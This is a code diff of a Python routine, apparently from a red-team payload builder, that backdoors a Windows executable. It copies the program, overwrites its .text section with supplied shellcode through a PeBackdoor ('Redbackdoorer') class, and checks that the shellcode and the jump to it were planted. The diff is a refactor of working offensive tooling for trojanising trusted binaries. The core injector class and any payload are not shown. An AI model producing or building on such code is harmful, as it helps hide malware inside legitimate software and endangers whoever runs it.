@@ -24,51 +24,32 @@ def inject_exe(
         shellcode_in, exe_in, exe_out, inject_mode
     ))
 
-    shellcode = file_readall_binary(shellcode_in)
-    shellcode_len = len(shellcode)
+
 
     # create copy of file exe_in to exe_out
     shutil.copyfile(exe_in, exe_out)
-
-    if False:
-        # python3.exe .\redbackdoorer.py 1,1 main-clean-append.bin .\exes\procexp64-a.exe
-        run_process_checkret([
-            "python3.exe",
-            "redbackdoorer.py",
-            project.inject_mode,
-            shellcode_in,
-            exe_out
-        ])
     
-    # copy it first...
-    temp = tempfile.NamedTemporaryFile(delete=False)
-    shutil.copy(exe_out, temp.name)
-    outfile = temp.name
-
+    # backdoor
     peinj = PeBackdoor()
     result = peinj.backdoor(
         1, # always overwrite .text section
         inject_mode, 
         shellcode_in, 
-        exe_out, 
-        outfile
+        exe_in, 
+        exe_out
     )
     if not result:
         logging.error("Error: Redbackdoorer failed")
         raise Exception("Redbackdoorer failed")
 
-    # and copy back
-    shutil.copy(outfile, exe_out)
-    temp.close()
-    os.unlink(temp.name)
-
-    # verify
+    # verify and log
+    shellcode = file_readall_binary(shellcode_in)
+    shellcode_len = len(shellcode)
     code = extract_code_from_exe(exe_out)
     in_code = code[peinj.shellcodeOffsetRel:peinj.shellcodeOffsetRel+shellcode_len]
     jmp_code = code[peinj.backdoorOffsetRel:peinj.backdoorOffsetRel+12]
     observer.add_code("backdoored_code", in_code)
     observer.add_code("backdoored_jmp", jmp_code)
-
     if in_code != shellcode:
         raise Exception("Shellcode injection error")
 
